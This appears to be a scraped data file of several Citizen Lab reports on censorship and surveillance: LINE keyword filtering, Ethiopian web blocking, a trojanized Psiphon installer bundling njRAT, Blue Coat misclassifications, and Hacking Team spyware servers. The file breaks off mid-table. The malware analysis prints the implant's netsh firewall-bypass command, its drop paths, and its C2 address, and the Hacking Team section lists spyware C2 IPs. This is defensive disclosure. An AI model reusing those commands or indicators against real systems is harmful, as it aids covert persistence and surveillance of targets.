between the LINE and Qihoo 360 and information on the process for determining the content of keyword lists. We received a terse reply:\n“LINE had to conform to local regulations during its expansion into mainland China, and as a result the Chinese version of LINE, ‘LIANWO,’ was developed. The details of the system are kept private, and there are no plans to release them to the public”.\nDespite the lack of information provided by LINE Corporation around its operations in China, it is clearly maintaining keyword filtering features for users in the country. Previous work on the censorship practices of chat clients, blog services, and search engines in China reveal inconsistencies in the specific keywords and content that are targeted for blocking, but general similarities in content categories. These differences suggest that companies may be given general guidelines from government authorities on what types of content to target but have some degrees of flexibility on how to implement these directives. The LINE keyword lists appears to fit these findings, but the process of developing and implementing content filtering policies and the interactions between LINE Corporation, its domestic partners, and Chinese authorities remain unknown.\nResources\n\n\nRaw and translated LINE keyword list data on Github\n\n\n\n\nLINE Region Code Encrypter Tool  for changing regions in the LINE client to disable regionally-based keyword censorship in the application\n\n\n\n\t\t\t\t\n\t\t\t",

    "text": "\n\t\t\t\tOn March 25, 2014, Human Rights Watch (HRW) released “‘They Know Everything We Do’: Telecom and Internet Surveillance in Ethiopia”, which describes the extensive use of surveillance technology by the government of Ethiopia. This report, which includes in-depth interviews with persons targeted by surveillance and former government officials, details the technologies used to conduct surveillance on opposition activist and journalists, both in Ethiopia and abroad.\nAs a part of the report, Citizen Lab collaborated with HRW to conduct network measurement tests for Internet censorship in July and August of 2013. These measurements were obtained through tools and methods for Internet censorship research we have developed as part of the OpenNet Initiative. This testing found dozens of websites to be blocked, including those of opposition parties, critical bloggers, and independent media. In total, 1,411 unique URLs were tested in 19 separate tests run over 7 days. Of these, 62 different URLs were identified as blocked. Consistent with past testing results, such websites were not blocked transparently, and instead were blocked using methods (primarily injected RST packets) which are difficult for an average user to distinguish from transient network problems.\nIn addition to censorship testing, HRW’s report also draws on Citizen Lab’s past research into the use of surveillance technology in Ethiopia and against the Ethiopian diaspora community. This includes our February 2014 report, ‘Hacking Team and the Targeting of Ethiopian Journalists’, which documents a targeted attack against an overseas Ethiopian independent satellite news media outlet using commercial surveillance malware created by Italy-based Hacking Team. The report also refers to Citizen Lab’s research into the use of another surveillance malware package, FinFisher by Munich-based Gamma International GmbH, which described the use of compromised images of an Ethiopian opposition group to target users.\nThe full list of URLs found blocked in Ethiopia in July/August 2013, as well as the full list of URLs tested, can be found here:\nURLs tested in July/August 2013\n\n[CSV]\n[Google Docs]\n[Github]\n\nURLs found blocked in July/August 2013\n\n[CSV]\n[Google Docs]\n[Github]\n\n \n\n\t\t\t\t\n\t\t\t",

    "description": "Download PDF version I Read on ISSUU",
    "text": "\n\t\t\t\tDownload PDF version I Read on ISSUU\nAuthor: John Scott-Railton\nSummary\nThe Citizen Lab developed the original design of Psiphon, a censorship circumvention software, which was spun out of the lab into a private Canadian corporation (Psiphon Inc.) in 2008. In the past 24 hours, we have identified a malicious repackaging of the Psiphon 3 circumvention tool.  The malware contains both a functioning copy of Psiphon, and the njRAT trojan. When executed, the implant communicates with a Syrian Command and Control server.  This is likely part of a targeted attack against the Syrian opposition by a known actor, not all users of Psiphon.\nInterestingly, this is not the first time we identified a malicious repackaging of circumvention programs in the context of the Syrian conflict.  For example, in June 2013 we published a report describing how attackers had maliciously modified the proxy software Freegate.\nThis brief note describes the implant’s appearance and behavior, then explains how to obtain and verify genuine copies of Psiphon 3.  The Psiphon team is monitoring the attack, and Karl Kathuria (Psiphon’s VP) encourages all new users of Psiphon to check the validity of their client. If in doubt, visit psiphon.ca to download a new copy.\nDetails and Appearance of the Malware\nThe file name and icon are intended to appear identical to a genuine Psiphon 3 executable file.  The malware is believed to be part of an active campaign.\nMalicious (left) and genuine (right) Psiphon 3 icons\nFile Properties\nFilename: psiphon.exe\nMD5: 28bf01f67db4a5e8e6174b066775eae0\nThe malware was first observed on the night of 11 March 2014 (Pacific Time):  Virus Total has the binary with detection of 3/50 at time of writing.\nExamination of the properties of a malicious and genuine Psiphon 3 provides the first clue that the file may not be what it seems.  The malicious packaging is unsigned, whereas Psiphon 3 is always signed.\nMalicious file (left) and genuine Psiphon 3 (right). Note the original “Windows.exe” file name and the absence of a digital signature in the fake.\nThe file appears to have been written in Visual Studio, and the PE is .NET dependent.  Examination of strings in the binary indicate limited operational security (or deliberate misinformation) on the part of the attackers.\nFor example:\nc:\\users\\allosh hacker\\documents\\visual studio 2012\\Projects\\allosh\\allosh\\obj\\Debug\\Windows.pdb\nInfection & Persistence\n Once executed, the user sees the Psiphon 3 GUI. The malware has, in fact, dropped and executed a working copy of Psiphon 3 alongside the implant.\nPsiphon 3 GUI shown to the victim while the implant is dropped.\nA malicious file is dropped by  psiphon.exe into the User’s AppData\\Local folder:\nC:\\Users\\[USER]\\AppData\\Local\\Tempserver.exe\nMD5: e1f2b15ec9f9a282065c931ec32a44b0\nPsiphon 3 is dropped and run from the same directory:\nC:\\Users\\[USER]\\AppData\\Local\\Temppsiphon3.exe\nMD5: 81287134d7aa541beae4b000d4ab3f19\n\nThe Psiphon 3 binary is functional, and is digitally signed by Psiphon.  The attacker appears to have used a very recent copy of Psiphon 3.\n\n\nMeanwhile, Tempserver.exe makes the infection permanent by adding a copy of itself to the Windows Startup folder named “chrome.exe.”\nC:\\Users\\[User]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\chrome.exe\nMD5: e1f2b15ec9f9a282065c931ec32a44b0\nTempserver.exe also copies itself as explorer.exe, and executes the newly created PE implant.\nC:\\Users\\[User]\\AppData\\Roaming\\Explorer.exe\nMD5: e1f2b15ec9f9a282065c931ec32a44b0\nThis file is, in fact, the trojan njRAT.\nProperties of explorer.exe (njRAT).\nSome Other Behavior\nThe implant, explorer.exe, begins collecting keystrokes, and writing the output to a file in the directory it was created in.\nC:\\Users\\[USER]\\AppData\\Roaming\\Explorer.exe.tmp\nHere we see the keylogger capturing credentials as the victim enters credentials into Gmail.com via Internet Explorer and writing them to  Explorer.exe.tmp.\n14/03/12 iexplore Gmail – Windows Internet Explorer\ndummy.login[TAP]\ndummy.password\nInterestingly, the keylogger records “TAB” as “TAP,” a behavior that may help in identification.\nAmong other activities, the implant modifies the Windows Firewall to allow itself access to the network by issuing the following command line to netsh.exe\nnetsh firewall add allowedprogram “C:\\Users\\[User]\\AppData\\Roaming\\Explorer.exe” “Explorer.exe” ENABLE\nCommand & Control\nThe implant initiates a TCP connection with 31.9.48.141 from port 49189 to the C2 on port 1960. Whois records for this IP address indicate that it is in Syria.\ninetnum: 31.9.0.0 – 31.9.127.255\nnetname: SY-ISP-TARASSUL\ndescr: Tarassul inetnet Service Provider\ncountry: SY\nAnalysis\nPsiphon 3 is a widely used and trusted circumvention product. It is unsurprising that it, along with other security and communications tools used by Syrian opposition groups, should be maliciously re-purposed.  We do not believe this indicates a broader attack against Psiphon 3 users throughout the globe.  Instead we suspect this was developed for yet another targeted attack against the opposition.  Similarly, njRAT has been widely used by attackers in Syria, and is frequently packaged with dummy or functional programs.  The continued targeting of security and communications is insidious: it reflects a well-informed approach to targeting the Syrian opposition with social engineering.\nAttacks similar to this are complemented by others using intriguing political or religious content, and other forms of social engineering.  Such attacks have been extensively analyzed by my Citizen Lab colleague Morgan Marquis-Boire and reported by Eva Galperin of the EFF, as well as many other researchers.  The most recent joint Citizen Lab and EFF report (December 2013) can be found here.\nActions to Take\nThe developers of Psiphon were notified of the malware and suggest concerned users take the following steps (content adapted from their website).\n\nCheck your copy of Psiphon for windows by following these simple steps outlined by Psiphon on their website:\n Right click on the Psiphon icon and select “Properties”\nYou should see a “Digital Signatures” tab.  Click it. If you do not see this tab, you may be looking at malware.\nExamine the Digital Signatures Tab.  Does it look like the image below? (Click for larger image)\nPsiphon’s website states:”The SHA1 thumbprint for the Psiphon Inc. certificate public key is displayed in the Certificate dialog Details tab. For the certificate valid for the period June 16, 2011 to June 21, 2012 the SHA1 thumbprint is:8f:b7:ef:bd:20:a9:20:3a:38:37:08:a2:1e:0a:1d:2e:ad:7b:ee:6dThe certificate valid for the for the period May 21, 2011 to July 30, 2014 the SHA1 thumbprint is:84:c5:13:5b:13:d1:53:96:7e:88:c9:13:86:0e:83:ee:ef:48:8e:91Psiphon for Windows auto-updates itself, and this process automatically verifies that each update is authentic.”\nNote: while the malware does drop a working copy of Psiphon 3 (with a digital signature), it will be in a different directory than the one you executed Psiphon from (C:\\Users\\[USER]\\AppData\\Local\\Temppsiphon3.exe)\nThe developers of Psiphon encourage anyone interested in Psiphon 3 to take these steps to ensure their copy of Psiphon is genuine. If in doubt, send a blank email to get@psiphon3.com to receive a new copy. Any questions for Psiphon’s developer team can be sent to info@psiphon.ca.\n\nIn addition, while the malicious packaging results in a working copy of Psiphon and has a visually indistinguishable icon, the malware also leaves a number of files, any of which should be considered strong evidence of an infection.  Here are several to watch out for:\nC:\\Users\\[Your Username]\\AppData\\Local\\Tempserver.exe\nC:\\Users\\[Your Username]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\chrome.exe\nC:\\Users\\[Your Username]\\AppData\\Roaming\\Explorer.exe\nC:\\Users\\[Your Username]\\AppData\\Roaming\\Explorer.exe.tmp\nIf these files are found, Machines should be disconnected from the internet and reformatted.  Additionally, users should take immediate steps to secure their accounts, as well as contacting others whose sensitive information may have been incidentally exposed.\nIn addition to these recommendations, we also suggest that, when possible, users make use of 2 factor authentication.\n\n To learn more about how to enable 2-Factor Authentication, see the links below for guides on how to do this on Facebook, Gmail and Twitter.\n\n2 Factor Tutorial for Facebook\nEnable 2 Factor for Gmail\nEnable 2 Factor for Twitter\nWe note, however, that it is difficult for users in Syria to implement 2 factor authentication.  The Google Play store is blocked for Syrian users by Google because of current Sanctions and Export Control regulations. This makes it difficult to obtain the 2-factor authentication app.  Use of SMS messages as an alternative may present an unacceptable risk of exposure to surveillance. This remains an unresolved problem.\nAcknowledgments\nPsiphon Team and Karl Kathuria, Nart Villeneuve (FireEye) for first conclusively identifying this as njRAT, Morgan Marquis-Boire (Citizen Lab),  Seth Hardy (Citizen Lab) and Irene Poetranto (Citizen Lab).\n\n\t\t\t\t\n\t\t\t",

    "description": "Download PDF version I Read on ISSUU",
    "text": "\n\t\t\t\tDownload PDF version I Read on ISSUU\nAuthor: Bennett Haselton\nAs of this writing, the websites of the New Braunfels Republican Women, the Kiddie Kollege Nursery School, the Freemasons’ District Grand Lodge of East Africa, the Weston Community Children’s Association, and the Rotary Club of Midland, Ontario are all categorized as “pornography” by Blue Coat Internet blocking software. Blue Coat Systems provides a lookup form that you can use to see how their system categorizes a website; you can see the screen captures for the categorizations of the above-listed sites here, here, here, here, and here. (The complete list of miscategorized sites that we found, is listed at the end of this report. Unless otherwise specified, all sites mentioned in this report, are currently classified by Blue Coat as “pornography.”)\nBlue Coat Systems is based in Sunnyvale, California and manufactures a range of Internet filtering products, often used in schools and workplaces. On any network where the software is installed and configured to block sites categorized as “pornography,” users will be denied access to such sites.\nThe company was previously the subject of an in-depth report published by the Citizen Lab in January 2013, describing the use of Blue Coat devices in Syria and Burma for mandatory country-wide Internet censorship. Several dozen other Blue Coat installations were found in 19 “countries of interest” that were known to have a history of Internet censorship and human rights violations, such as China, Saudi Arabia, and Venezuela. As discussed in the report, it is not currently against US law for American companies to sell censorship software to foreign governments, although the practice is controversial. However, the use of the filtering appliances on Syrian networks prompted concerns from the US Department of Commerce about whether Blue Coat had sold those devices in violation of U.S. sanctions against Syria. Blue Coat claimed that the products had been bought by an entity in Dubai and re-sold to ISPs in Syria without Blue Coat’s knowledge.\nCitizen Lab’s report concluded by posing several questions to Blue Coat, such as: “What human rights policy commitments and due diligence measures does Blue Coat Systems have in place concerning the development and sales of its products and services?” The report stated: “We commit to publishing in full Blue Coat System’s reply.” Citizen Lab did not receive a response from the company.\nCompared to the practice of selling “censorware” to foreign governments with poor human rights records, there has been far less controversy over the simple miscategorization of websites as “pornography” by Internet blocking companies. There have been no public reports to date on sites that have been miscategorized by Blue Coat specifically, although there have been reports about other products, such as Citizen Lab’s post in November 2013 about sites miscategorized by SmartFilter. (As discussed below, a few sites actually showed up on both lists—miscategorized as “pornography” by both Blue Coat and SmartFilter—for reasons that are not clear.)\nSome of the entities whose websites were classified as “pornography,” such as the Kiddie Kollege Nursery School, or the Lotus Valley Public School of Haryana, India, would likely be scandalized if their customers or the public came to believe, as a result of misclassification by Blue Coat, that their websites really were hosting “pornography.” (In the case of other miscategorized websites such as http://www.dicksofamerica.org, the proprietors would most likely be bemused by error.)\nAs with the SmartFilter report, we tested a large number of URLs against Blue Coat’s filtering system using a combination of ad hoc spidering and URL lists. After identifying a subset of URLs classified by Blue Coat as “pornography,” we reviewed the site contents to identify classifications that appeared to be errors. Some were obvious errors, and others were “borderline cases,” where the site contained no true pornography but it is plausible that a reviewer might have mistakenly applied the label after finding the site’s contents to be “inappropriate.” Blue Coat’s site lookup form gives their working definition of “pornography:”\nSites that contain sexually explicit material for the purpose of arousing a sexual or prurient interest.\nNone of the sites we counted as “errors,” contained any material that we could find which fit that definition.\nWhile Blue Coat’s site lookup form does not give a reason for the categorization of particular sites, there were some sites for which we could infer a possible reason for the miscategorization. Only one site in our list, http://www.againstchildporn.org, contained an obvious keyword (“porn”) in the domain name which would have likely caused the site to be misclassified. A few other sites such as http://www.gambiawomen.org (“women”) and http://www.dicksofamerica.org (“dicks”) contained keywords which may have triggered the “pornography” categorization. (The latter site does in fact reference the humorous use of the word “dick,” although it is also the site owner’s first name.) Several other sites in our list contained content on the front page that may have caused Blue Coat’s system to categorize the site as “pornography:”\n\n\n\n \n\n\nhttp://www.foundations4betterliving.org\nThis website quotes these statistics on the front page: “A growing variety of sexual behaviour is being practiced by teens 15- to 19-year-old, a study by Urban Institute shows:- 53% admit to masturbating.\n– 49% have participated in oral sex.\n– 39% have given oral sex.\n– 11% have had anal sex.\n– Kids perceive oral and anal sex as ‘not really sex’ and often as part of abstinence.”\n\n\nhttp://www.gargaro.org\nCarolyn Gargaro’s website, “Home of a Conservative Female,” has a link to pages of “cam” (i.e. webcam) photos. Webcam photos are so commonly found on pornographic websites that the term “cam” may have triggered a keyword filter, although Gargaro’s photos are exclusively non-pornographic pictures of her sitting at her desk.\n\n\nhttp://www.kohnke.org\nThe Kohnke family home page features family photos, including a link labeled “new kid pics,” which a keyword filter may have assumed referred to pornography.\n\n\nhttp://www.nbrw.com\nThe home page New Braunfels Republican Women may have been miscategorized because of the word ‘women’ in the title. (This site, in fact, was also categorized by SmartFilter as ‘pornography.’)\n\n\nhttp://www.PurityRevolution.org\nThis site advocates abstinence for teenagers, and contains numerous instances of the words “sex” and “oral sex,” mostly in close proximity of the word “teen.” (However, we also note that the same website is reachable by the URL http://www.braveheart.org, and this URL is categorized by Blue Coat (accurately) as “Charitable Organizations and Sex Education.” This counts as evidence against the notion that the URL http://www.PurityRevolution.org was blacklisted solely because of the keywords on the front page. On the other hand, it is possible that Blue Coat’s crawler visited the URLs http://www.PurityRevolution.org and http://www.braveheart.org at different times, and in the interim had changed its threshold for categorized a site as “pornography,” which could possibly lead to one URL being categorized as “pornography” but not the other.)\n\n\nhttp://www.therapy-space.org\nThis website is titled “Porn Recovery UK” and is categorized by Blue Coat as “pornography.” (On the other hand, the actual website http://www.porn-recovery.co.uk, which appears to be run by the same organization but contains different content, is categorized by Blue Coat as “health.”)\n\n\nhttp://neobit.org\nneoBIT.org advertises itself as a maker of emulators for “dongles.” (The word “dongle,” which appears twenty-two times on the neoBIT.org homepage, has never actually entered popular usage as anatomical slang, but the suggestiveness of the word has often been employed for humour.)\n\n\n\nMeanwhile, there are a few sites in our sample categorized by Blue Coat as “pornography”, whose content is not pornographic, but may have been considered sufficiently “questionable” that it’s plausible that a human reviewer may have miscategorized it:\n\n\n\n \n\n\nhttp://www.dicksofamerica.org\nAccording to the site, “Dicks of America is an organization dedicated to making Dick the most beloved name in America – if not the world! The name Dick has become a four-letter-word that also refers to a very familiar part of the male anatomy. Why, it’s enough to get a Dick down!” A human reviewer, believing the site content to be not “appropriate” for work, could have hastily classified it as “pornography.”\n\n\nhttp://www.foib.org\nThe website, “Fuck Off, I’m Busy,” is intended as a link to send to friends to indicate one wants to be left along. Again, not pornographic.\n\n\nhttp://www.mapsu.org\nThe website, “Mothers Against Peeing Standing Up,” contains a stick figure of a male urinating, but even the stick figure doesn’t have a visible penis.\n\n\nhttp://www.discomfortzone.org\nThe website is subtitled “the pain & ecstasy of learning,” and the first photo on the page is of a pair of boots (paired with a blog post titled “Spanish Boot Camp”). It is plausible that a person making a very quick glance at the site (perhaps under pressure to review a large number of sites at once) might have made the connection between “pain & ecstasy” and dominatrix boots, and classified the website as sexually explicit.\n\n\nhttp://www.fourthewin.org\nThe website is described as “an artist collective of four awesome girls.” The front page contains a graphic showing cartoon caricatures of the four authors. Again, an overworked human reviewer might have made a very cursory glance at the page contents and believed the image to be too suggestive or indicative of anime pornography.\n\n\nhttp://safe-sex.org \nThis safe sex website does contain blog posts on somewhat prurient topics such as “Safe Sex with Expensive London Escorts” (and some phrases such as “expensive London escort girls” are even linked to real escort websites, which may be part of a pay-for-link arrangement). However, the site itself still contains no pornography and apparently not even any nudity (a picture on the front page, emphasizing condom usage, shows a condom being fitted over a sausage).\n\n\nhttp://www.performancespace.org\nThis art collective website has some photos of nearly nude models, but in the photos we reviewed, no models were actually nude and the photos were in any case not sexually explicit.\n\n\n\nIt would be natural to assume that, in the cases of the sites listed above, the reason they were mistakenly blocked as “pornography” by Blue Coat was either because of the keywords that appear on the page or in the domain name, or because of their “borderline” content. Certainly out of the sites that we found to be blocked in error, a high proportion of them contain “borderline” content and probable-trigger keywords, higher than would be expected if we had selected sites from the web at random.\nOn the other hand, many other websites such as Singing Bowls of Tuscon Shambhala, The Sumter Community Concert Band, and Reunion Ministries, are also categorized by Blue Coat as “pornography” despite having no pornographic content and no apparent keywords or content that could have triggered even an accidental misclassification as “porn.”\nSo, it is possible that a certain number of sites are wrongly blocked by Blue Coat as a result of some pseudo-random process, and a certain number of those sites will just happen to have keywords or questionable content on them—but the keywords and the content may not be the cause of the blocking. (It is impossible to know for sure, since Blue Coat’s lookup form does not give reasons for a site’s classification.)\nA small number of sites in our sample were miscategorized by both SmartFilter and Blue Coat as “pornography.” They are:\n\n\n\n\n\n\nhttp://www.balticsail.org\nA site promoting sailing in the Baltic Sea.\n\n\nhttp://www.barenboimsaidusa.org\nA youth orchestra featuring musicians from Israel, Palestine, and various Arab countries.\n\n\nhttp://www.fias.org\nThe International Sambo Federation.\n\n\nhttp://www.germanhouse.org\nMax Kade Language House at the University of Virginia for students studying German.\n\n\nhttp://www.moriah.org\nThe Moriah School, a Jewish boarding school in New Jersey.\n\n\nhttp://www.nbrw.com\nThe New Braunfels Republican Women, of New Braunfels, Texas.\n\n\nhttp://www.rediscover-iran.org\nA program promoting summer programs in Iran for Iranian-Americans.\n\n\nhttp://www.reunioncenter.org\nReunion Ministries, a religious non-profit organization offering counselling and healing services.\n\n\n\nThe fact that these sites are miscategorized by both products is something of a mystery. If either SmartFilter or Blue Coat were simply miscategorizing a random subset of non-pornographic websites as “pornography,” then we would expect the overlap to be much smaller. (Out of roughly 150 websites listed in each report, eight were also miscategorized by the other product, or about six percent. But despite all the errors made by both products, the proportion of non-pornographic websites that either product categorizes as “pornography” is generally far less than six percent. So the high overlap appears to be due to something other than chance.) However, there appears to be no common factors that would cause these websites to have a greater-than-average chance of being miscategorized as “pornography.” None of them contain any questionable content or keywords likely to trigger a “pornography” categorization (except possibly for the “New Braunfels Republican Women”).\nThe sampling of sites that we found to be incorrectly classified as “pornography” by Blue Coat, is below. Each site is listed together with a link (labeled “sc”) to a screen capture showing the site classified as “pornography” on Blue Coat’s lookup form. The classifications are current as of this writing; Blue Coat may change the categorization of these sites in the future.\n\n\n\nhttp://www.3m8.org (sc)\nA Chinese gaming platform company.\n\n\nhttp://www.accidentallygreen.org (sc)\nA blog by Hilary Bernstein about making environmentally conscious decisions in a context of religious belief.\n\n\nhttp://www.acerfoundation.org (sc)\nA charitable foundation run by the Acer computer company.\n\n\nhttp://www.againstchildporn.org (sc)\nA German-language site campaigning against child pornography.\n\n\nhttp://www.alabamaearthdog.org (sc)\nA Border Terrier club in Fairhope, Alabama.\n\n\nhttp://www.alfa-1.org (sc)\nAn auto parts and service company in Mexico.\n\n\nhttp://www.altaer.org (sc)\nA Colorado-based community blog promoting healthy living through wilderness activities.\n\n\nhttp://americandreamer.org (sc)\nA film-making collective in Los Angeles.

We did not count such sites as “incorrectly classified” when Blue Coat listed them as “pornography,” due to the presence of the sexually explicit text. However, we believe the best practice on Blue Coat’s part would have been to:\n1) give the sites a special classification indicating that the site appeared to have been hacked temporarily;\n2) notify the site owners where possible; and\n3) re-check the site periodically to see if the problem had been fixed and the text had been removed. In cases where we could find contact information for the sites in question, we sent them a message indicating that they had been hacked.\nOur testing indicated that these non-pornographic websites, despite being classified as “pornography,” were not generally blocked in countries that we had found to be using Blue Coat Internet censorship appliances. As far as we can tell, the United Arab Emirates, as mentioned in our previous report on SmartFilter, is using Blue Coat’s hardware and software, but filtering websites on SmartFilter’s list. (Therefore, the only sites in our list above that were blocked in the United Arab Emirates are the sites that are also categorized as “pornography” in SmartFilter’s database.)\nHowever, as a follow-up to our post about the number of sites miscategorized by SmartFilter, our tests with Blue Coat show that this is not a problem limited to a single product. We should be skeptical of any company’s claims that they are able to categorize much of the web accurately, or that their rate of “collateral damage” is very low.\nAcknowledgements\nThe author thanks Citizen Lab for their support of this project and for their feedback and assistance during the research process.\n\n\t\t\t\t\n\t\t\t",

    "text": "\n\t\t\t\tDownload PDF version  I Read on ISSUU\nReport Date: March 4, 2014\nAuthors: Bill Marczak, Claudio Guarnieri, Morgan Marquis-Boire, John Scott-Railton, and Sarah McKune\nThis post is the third in a series of posts that focus on the global proliferation and use of Hacking Team’s RCS spyware, which is sold exclusively to governments.\nRead the report’s coverage in the Washington Post.\nRead the first report in the series, “Hacking Team and the Targeting of Ethiopian Journalists.”\nRead the second report in the series, “Mapping Hacking Team’s “Untraceable” Spyware.”\n \nSummary\n\nRemote Control System (RCS) is sophisticated computer spyware marketed and sold exclusively to governments by Milan-based Hacking Team.1  RCS can record Skype calls, copy passwords, e-mails, files and instant messages,2 and turn on a computer or phone’s webcam and microphone to spy on nearby activity.3  An earlier Citizen Lab report showed how one RCS user believed to be the Ethiopian Government—targeted journalists in the Washington DC area with the spyware.  Previously, governments have used RCS to target journalists in Morocco,4 activists in the UAE,5 and a US-based critic of Turkish charter schools.6\n\n\nTwo weeks ago, the present authors released a report Mapping Hacking Team’s “Untraceable” Spyware, which identifies 21 governments that we suspect are current or former users of RCS. The report showed that computers infected with RCS send surveillance data back to the government operator through a series of servers in multiple third countries, called a proxy chain or circuit. This is to prevent someone who discovers a copy of the spyware or an infected computer from tracing it back to the government. For example, an infected target may discover that his computer is sending information to a server in Fremont, California, but would not be able to trace the ultimate destination of this information to Uzbekistan.\n\n\nIn this post, we delve deeper into these proxy chains, and find that in at least 12 cases, US-based data centers are part of this dedicated foreign espionage infrastructure.  Our analysis traces these proxy chains, and finds that US-based servers appear to assist the governments of Azerbaijan, Colombia, Ethiopia, Korea, Mexico, Morocco, Poland, Thailand, Uzbekistan, and the United Arab Emirates in their espionage and/or law enforcement operations.  Azerbaijan, Ethiopia, and Uzbekistan receive the lowest ranking, “authoritarian,” in The Economist’s 2012 Democracy Index.7\n\n\nThe extensive and deliberate use of dedicated US hosting companies by foreign countries’ wiretapping activities raises a number of pressing legal and policy concerns. These include whether RCS client countries violate US law and longstanding international legal principles on sovereignty and nonintervention through use of this spyware. Moreover, RCS client countries, by exposing wiretap data to US and other jurisdictions, may have violated internal laws governing the safeguarding of wiretapped material.\n\n\nWe also identify several cases where US-based spyware servers were disguised as the websites of US companies, including a small New York-based financial services firm related to an SEC investigation, a small Oregon newspaper, and ABC News.  We believe that the disguises were designed to mislead targets if they discovered that their systems were communicating with these servers.  Thus, we believe that the targets of the the spyware in these instances had some familiarity with these companies.\n\n \nForeign Espionage Using US Servers\nRCS’s use of third-country proxy servers8 to launder data from infected computers back to the government operator of the spyware raises a number of questions.  First, how are the third-country proxies selected?  Are the proxy locations selected by Hacking Team itself, or its government clients?  If Hacking Team selects the locations, does it inform its clients of these?  How does Hacking Team represent itself when engaging with a hosting company to procure servers for use as proxies?  Does Hacking Team evaluate the laws of the countries in which it employs servers to determine the legality of their use for surveillance?  The answers to these questions have important legal and policy implications, discussed below.\n\nFigure 1: US Nexus of Hacking Team Circuits\n \nWe found 10 foreign governments using RCS proxy chains with a US nexus:\n\n\n\n \n\n\nNumber of Hacking Team RCS servers\n555\n\n\nNumber of Hacking Team RCS servers in the US\n114\n\n\nNumber of identified RCS proxy chains\n103\n\n\nNumber of identified RCS proxy chains with US nexus\n22\n\n\nRCS proxy chains with US nexus attributed to foreign governments\n14\n\n\nNumber of foreign governments using RCS proxy chains with a US nexus\n10\n\n\n\n \nWe found 10 foreign governments using RCS proxy chains with a US nexus:\n\n\n \n\n\nAzerbaijan, Colombia, Ethiopia, Korea, Mexico, Morocco, Poland, Thailand, Uzbekistan, and UAE\n\n\n\n \nClick here For Appendix A and a full list of all circuits with a US Nexus.\n \n\n \n\n \nOther Transit Countries\nBeyond the US, a number of other countries are also large hosters of Hacking Team servers.  We list the top 5 countries and top 5 providers below:\n\n\n\n \n\n\nProvider\nNumber of Servers\n\n\nLinode\n80\n\n\nTelecom Italia\n32\n\n\nSantrex\n26\n\n\nRackspace\n19\n\n\nNOC4Hosts\n16\n\n\n\n\n\n\n \n\n\nCountry\nNumber of Servers\n\n\nUnited States\n114\n\n\nItaly\n48\n\n\nUnited Kingdom\n43\n\n\nSeychelles\n26\n\n\nJapan\n17\n\n\n\n \nA Deliberate and Expansive US Nexus: Legal and Policy Implications\nThe US is a major provider of internet service, meaning that a great deal of global internet traffic passes through US servers. However, this case poses novel challenges that deserve heightened legal and policy scrutiny.\n\nThe passage of RCS traffic through the US is not normal routing incident to benign electronic communications, but the purposeful use of US servers for the surreptitious transmission of wiretapped data to foreign governments. Whether moving such information through US-based communications facilities violates US law, including the Computer Fraud and Abuse Act and the Wiretap Act, deserves immediate attention.\n\n\nWe doubt foreign governments using Hacking Team’s RCS spyware seek permission from the US government to engage in surveillance of US-based targets, or to transmit surveilled data obtained elsewhere through US-based services. Without that consent, foreign governments using the RCS spyware in this manner wilfully flout the international legal principles of sovereignty and nonintervention. These principles provide the basis for the formal rules and procedures states have developed for law enforcement cooperation and assistance concerning investigation of crimes with transnational dimensions. Moreover, unauthorized interception of electronic communications within the US by a foreign government is contrary to US law.\n\n\nWe question whether Hacking Team has informed its government clients of the potential legal liabilities raised by the design and operation of its RCS spyware. We also question whether Hacking Team tells its government clients that information obtained through domestically-initiated wiretaps passes by design through servers located in the US or other countries – routing that might violate that government’s own laws on electronic surveillance.\n\n\nHacking Team’s use of US-based services as part of its spyware also creates liabilities for the companies providing such service. As a matter of corporate social responsibility, these companies certainly would want to ensure that their services are not used for purposes potentially in violation of US and international law and inimical to the enjoyment of basic human rights. We suspect Hacking Team does not inform its US-based service providers of the nature of the data it transmits, and question what representations Hacking Team has in fact made to these companies.\n\n\nIn addition, the Hacking Team spyware appears to violate terms of service that internet service providers typically include in their contracts with customers. For example, under its terms of service, Linode can terminate a contract if a customer attempts unauthorized and / or illegal access to computers, networks or accounts not belonging to the party seeking access. Similarly, any act involving circumvention of security measures is forbidden.\n\nExcerpt from Linode’s Terms of Service9\nYou agree that any of the below activities are considered prohibited usage and will result in immediate account suspension or cancellation without a refund and the possibility that Linode.com will impose fees; and/or pursue civil remedies without providing advance notice. . . .\nAccess to Other Computers or Networks without Authorization: Attempting unauthorized and/or illegal access of computers, networks and/or accounts not belonging to party seeking access. Any act which interferes with the services of another user or network. Any act relating to the circumvention of security measures.\nThe operation of Hacking Team’s spyware in many situations involves knowing violation of such contractual terms, and companies used to facilitate the spyware’s functioning are well within their rights to terminate the service and pursue other legal remedies.\nAs our research peels back the layers of obfuscation that are inherent to the spyware market, it is becoming clear that this market takes advantage of opaque or non-existent laws, rules, and procedures—in effect, slipping through the cracks of the international system. Remedying the adverse consequences of this market will require filling those gaps.\n \nA Perplexing Case: Redirections to US servers\nSeparate from foreign use of US infrastructure to launder data from infected computers back to government operators, we identified the possible use of US servers to target US-based targets.  We are unable to speculate as to the government operators in this case.\nIn 2012 and early 2013, most Hacking Team servers, when viewed in a web browser, were disguised as http://www.google.com, i.e., they loaded a page that immediately redirected to Google.  This redirection is never invoked by the spyware itself, and seems designed to make a Hacking Team RCS server appear to be another website to an individual who loads the server address into their web browser.10  However, we found a group of 20 highly distinctive Hacking Team servers hosted by Linode and Rackspace that were, in some cases, disguised as the websites of US-based corporations.  This was only one of two cases where we identified redirections to sites other than Google.  We briefly summarize the redirects we found in this group:\n\n\n\n\n\n\n\nC2 Server\nRedirected to Website\nDates of Redirect\n\n\n 198.101.232.81\n http://www.blackberry.com/btsc/kb18327\n 8/10/2012 – 8/30/2012\n\n\n 198.101.232.37\n http://www.blackberry.com/btsc/kb18327\n 8/10/2012 – 8/30/2012\n\n\n 50.56.182.189\n http://www.blackberry.com/security\n 10/26/2012\n\n\n 50.56.182.189\n http://www.apple.com\n 12/14/2012 – 12/15/2012\n\n\n 184.106.244.36\n http://www.apple.com\n 3/31/2013 – 5/9/2013\n\n\n 66.228.61.26\n http://www.apple.com\n 12/13/2012 – 5/7/2013\n\n\n 184.106.196.42\n http://www.mailtribune.com\n 12/14/2012 – 12/15/2012\n\n\n 108.171.173.171\n http://www.davidlerner.com/default.aspx\n 12/14/2012 – 5/2/2013\n\n\n 166.78.143.145\n http://www.fidelity.com\n 3/7/2013 – 4/18/2013\n\n\n 50.57.153.182\n http://www.publix.com\n 4/22/2013 – 5/5/2013\n\n\n 173.230.142.200\n 